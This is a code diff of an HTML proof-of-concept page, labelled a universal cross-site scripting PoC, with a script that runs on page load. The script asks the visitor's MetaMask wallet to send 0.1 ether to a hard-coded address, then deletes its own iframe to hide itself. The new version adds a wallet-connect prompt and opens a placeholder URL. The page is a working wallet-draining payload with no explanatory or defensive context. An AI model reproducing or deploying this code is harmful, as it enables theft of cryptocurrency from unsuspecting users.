@@ -1,28 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>UXSS PoC</title>
+    <title>Uxss PoC</title>
 </head>
 <body>
     <script>
         window.onload = function() {
-            // Create a Metamask transaction
-            ethereum.request({ method: 'eth_sendTransaction', params: [{
-                from: ethereum.selectedAddress,
-                to: '0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2',
-                value: web3.utils.toHex(web3.utils.toWei('0.1', 'ether')),
-            }],})
-            .then((txHash) => {
-                // Transaction successful
-                console.log(txHash);
-            })
-            .catch((error) => {
-                // Handle transaction error here
-                console.error(error);
-            });
+            // Check if Metamask is installed
+            if (typeof ethereum !== 'undefined') {
+                ethereum.enable()
+                .then(function(accounts) {
+                    // User has connected their wallet
+                    const userAddress = accounts[0];
+                    
+                    // Create a Metamask transaction
+                    ethereum.request({ method: 'eth_sendTransaction', params: [{
+                        from: userAddress,
+                        to: '0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2',
+                        value: web3.utils.toHex(web3.utils.toWei('0.1', 'ether')),
+                    }],})
+                    .then((txHash) => {
+                        // Transaction successful
+                        console.log(txHash);
+                    })
+                    .catch((error) => {
+                        // Handle transaction error here
+                        console.error(error);
+                    });
 
-            // Close the iframe after the transaction
-            window.frameElement.parentNode.removeChild(window.frameElement);
+                    // Remove "http://" prefix if it exists
+                    const url = 'your_url_here'; // Replace with the URL you want to open
+                    const sanitizedUrl = url.replace(/^https?:\/\//, '');
+
+                    // Open the URL without the "http://" prefix
+                    window.open(`http://${sanitizedUrl}`);
+
+                    // Close the iframe after the transaction
+                    window.frameElement.parentNode.removeChild(window.frameElement);
+                })
+                .catch(function(error) {
+                    // Handle Metamask enable error here
+                    console.error(error);
+                });
+            } else {
+                // Metamask is not installed
+                console.error('Metamask is not installed.');
+            }
         };
     </script>
 </body>
